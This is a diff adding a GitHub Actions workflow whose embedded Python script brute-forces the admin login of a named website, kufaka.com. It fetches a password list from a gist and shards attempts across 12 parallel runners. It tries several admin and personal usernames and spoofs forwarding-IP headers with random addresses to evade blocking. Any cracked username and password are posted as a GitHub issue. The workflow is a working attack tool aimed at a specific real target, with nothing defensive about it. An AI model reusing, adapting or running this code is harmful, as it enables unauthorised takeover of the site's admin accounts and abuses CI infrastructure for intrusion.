@@ -1,0 +1,176 @@
+name: kfb
+on:
+  workflow_dispatch:
+    inputs:
+      start:   {description: start,   required: false, type: string, default: "102367"}
+      end:     {description: end,     required: false, type: string, default: "309915"}
+      nshard:  {description: nshard,  required: false, type: string, default: "12"}
+      rate:    {description: rate,    required: false, type: string, default: "6"}
+      conc:    {description: conc,    required: false, type: string, default: "5"}
+      maxsec:  {description: maxsec,  required: false, type: string, default: "270"}
+      dicturl: {description: dicturl, required: false, type: string, default: "https://gist.githubusercontent.com/firstwxx1/e1cd727ccf10f9bec3c95f11e4c01f97/raw/00b88e5c593b81b01f1a6017b8f1c0c0fdca744d/dict.txt"}
+permissions:
+  contents: read
+  issues: write
+jobs:
+  b:
+    runs-on: ubuntu-latest
+    timeout-minutes: 300
+    strategy:
+      fail-fast: false
+      max-parallel: 12
+      matrix:
+        shard: [0,1,2,3,4,5,6,7,8,9,10,11]
+    steps:
+      - name: dict
+        run: curl -sL --retry 5 --max-time 120 -o /tmp/dict.txt "${{ inputs.dicturl }}" && wc -l /tmp/dict.txt
+      - name: brute
+        env:
+          START: ${{ inputs.start }}
+          END: ${{ inputs.end }}
+          NSHARD: ${{ inputs.nshard }}
+          RATE: ${{ inputs.rate }}
+          CONC: ${{ inputs.conc }}
+          MAXSEC: ${{ inputs.maxsec }}
+          SHARD: ${{ matrix.shard }}
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          REPO: ${{ github.repository }}
+        run: |
+          cat > /tmp/p.py <<'PYEOF'
+          import os, json, time, threading, random, sys, concurrent.futures
+          import urllib.request, urllib.error
+
+          START=int(os.environ.get("START","102367"))
+          END=int(os.environ.get("END","309915"))
+          NSHARD=int(os.environ.get("NSHARD","12"))
+          SHARD=int(os.environ.get("SHARD","0"))
+          RATE=float(os.environ.get("RATE","6"))
+          CONC=int(os.environ.get("CONC","5"))
+          USERS=[u for u in (os.environ.get("USERS") or "admin,administrator,root,firstwxx,firstwxx1,19022075515,xgift,cddznsn").split(",") if u]
+          DICT=os.environ.get("DICT","/tmp/dict.txt")
+          URL="https://www.kufaka.com/adminApi/auth/login"
+          UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
+          GH_TOKEN=os.environ.get("GH_TOKEN",""); REPO=os.environ.get("REPO","")
+          MAXSEC=float(os.environ.get("MAXSEC","280"))
+
+          def issue(title, body):
+              if not (GH_TOKEN and REPO): return
+              try:
+                  data=json.dumps({"title":title,"body":body[:60000]}).encode()
+                  req=urllib.request.Request("https://api.github.com/repos/%s/issues"%REPO,data=data,method="POST")
+                  req.add_header("Authorization","token "+GH_TOKEN)
+                  req.add_header("Accept","application/vnd.github+json")
+                  req.add_header("Content-Type","application/json")
+                  urllib.request.urlopen(req,timeout=30).read()
+                  print("ISSUE_CREATED",flush=True)
+              except Exception as e:
+                  print("ISSUE_ERR %s"%str(e)[:120],flush=True)
+
+          words=[w.rstrip("\n") for w in open(DICT,encoding="utf-8",errors="ignore") if w.strip()]
+          total=len(words)
+          size=(END-START+NSHARD-1)//NSHARD
+          lo=START+SHARD*size
+          hi=min(END,lo+size)
+          print("dict_total=%d shard=%d/%d range=[%d,%d) n=%d rate=%s conc=%d users=%s"%(total,SHARD,NSHARD,lo,hi,hi-lo,RATE,CONC,USERS),flush=True)
+          if lo>=hi:
+              print("RESULT shard=%d EMPTY"%SHARD); sys.exit(0)
+          if total!=309915:
+              print("WARN dict_total mismatch expected 309915",flush=True)
+
+          _rng=random.Random(int(time.time())^os.getpid()^SHARD)
+          def rip(): return "%d.%d.%d.%d"%(_rng.randint(1,223),_rng.randint(0,255),_rng.randint(0,255),_rng.randint(1,254))
+
+          _pace_lock=threading.Lock(); _next=[time.time()]
+          def pace():
+              d=1.0/RATE
+              with _pace_lock:
+                  now=time.time(); t=max(now,_next[0]); _next[0]=t+d; w=t-now
+              if w>0: time.sleep(w)
+
+          def classify(st,b):
+              if st in (403,429): return "blk"
+              if "操作频繁" in b: return "rl"
+              if "访问已被拦截" in b: return "blk"
+              if "用户名或密码不正确" in b: return "miss"
+              low=b.lower()
+              if "stat failed" in b or "splfileinfo" in low or "session" in low or "不能为空" in b: return "apperr"
+              if ("token" in low or "access_token" in low) and "用户名或密码不正确" not in b: return "hit"
+              return "other"
+
+          def attempt(i):
+              u=USERS[i%len(USERS)]; w=words[i]; ip=rip()
+              body=json.dumps({"username":u,"password":w}).encode()
+              req=urllib.request.Request(URL,data=body,method="POST")
+              req.add_header("Content-Type","application/json")
+              req.add_header("User-Agent",UA)
+              req.add_header("Referer","https://www.kufaka.com/package/admin/")
+              req.add_header("Origin","https://www.kufaka.com")
+              req.add_header("Accept","application/json, text/plain, */*")
+              req.add_header("X-Forwarded-For",ip); req.add_header("CF-Connecting-IP",ip); req.add_header("X-Real-IP",ip)
+              pace()
+              try:
+                  r=urllib.request.urlopen(req,timeout=25)
+                  st=r.status; b=r.read().decode("utf-8","ignore")
+              except urllib.error.HTTPError as e:
+                  st=e.code
+                  try: b=e.read().decode("utf-8","ignore")
+                  except Exception: b=""
+              except Exception as e:
+                  return ("err",str(type(e).__name__)+":"+str(e)[:60],i,u,w)
+              return (classify(st,b),b[:800],i,u,w)
+
+          def resolve(i):
+              last="err"; b=""
+              for k in range(9):
+                  cat,bb,ii,u,w=attempt(i)
+                  last=cat; b=bb
+                  if cat in ("hit","miss","apperr","other"): return (cat,b,i,u,w)
+                  time.sleep(0.35+0.45*k)
+              return (last,b,i,USERS[i%len(USERS)],words[i])
+
+          lock=threading.Lock(); cnt={}
+          t0=time.time(); lastrep=[0.0]
+          completed=set(); front=[lo]; failed=[]; HITTED=[False]
+          def bump(c):
+              with lock: cnt[c]=cnt.get(c,0)+1
+
+          def finish(i,cat,b,u,w):
+              bump(cat)
+              if cat=="hit":
+                  with lock: HITTED[0]=True
+                  print("!!! HIT idx=%d user=%s pass=%s resp=%s"%(i,u,w,b),flush=True)
+                  issue("HIT kufaka admin %s:%s"%(u,w),"idx=%d user=%s pass=%s\n\n%s\n\ninstall: python3 - <<'PY'\nimport urllib.request,json\n...\nPY"%(i,u,w,b))
+              elif cat=="err":
+                  failed.append(i)
+              with lock:
+                  completed.add(i)
+                  while front[0] in completed:
+                      completed.discard(front[0]); front[0]+=1
+              now=time.time()
+              if now-lastrep[0]>25:
+                  lastrep[0]=now; el=now-t0
+                  print("PROG shard=%d front=%d covered=%d n=%d rate=%.2f/s counts=%s"%(SHARD,front[0],front[0]-lo,hi-lo,(front[0]-lo)/max(el,1),dict(cnt)),flush=True)
+
+          with concurrent.futures.ThreadPoolExecutor(max_workers=CONC) as ex:
+              pend={}; k=lo
+              while k<hi and len(pend)<CONC:
+                  pend[ex.submit(resolve,k)]=k; k+=1
+              while pend:
+                  if time.time()-t0>MAXSEC:
+                      print("MAXSEC reached, stopping",flush=True); break
+                  done,_=concurrent.futures.wait(pend,return_when=concurrent.futures.FIRST_COMPLETED)
+                  for fu in done:
+                      i=pend.pop(fu)
+                      cat,b,ii,u,w=fu.result()
+                      finish(i,cat,b,u,w)
+                  if HITTED[0]: break
+                  while k<hi and len(pend)<CONC:
+                      pend[ex.submit(resolve,k)]=k; k+=1
+              for fu in pend: fu.cancel()
+
+          el=time.time()-t0
+          print("RESULT shard=%d front=%d lo=%d hi=%d covered=%d elapsed=%.0fs rate=%.2f/s counts=%s failed=%d"%(SHARD,front[0],lo,hi,front[0]-lo,el,(front[0]-lo)/max(el,1),dict(cnt),len(failed)),flush=True)
+          if failed: print("FAILED_IDX %s"%(",".join(str(x) for x in failed[:50])),flush=True)
+
+PYEOF
+          python3 /tmp/p.py
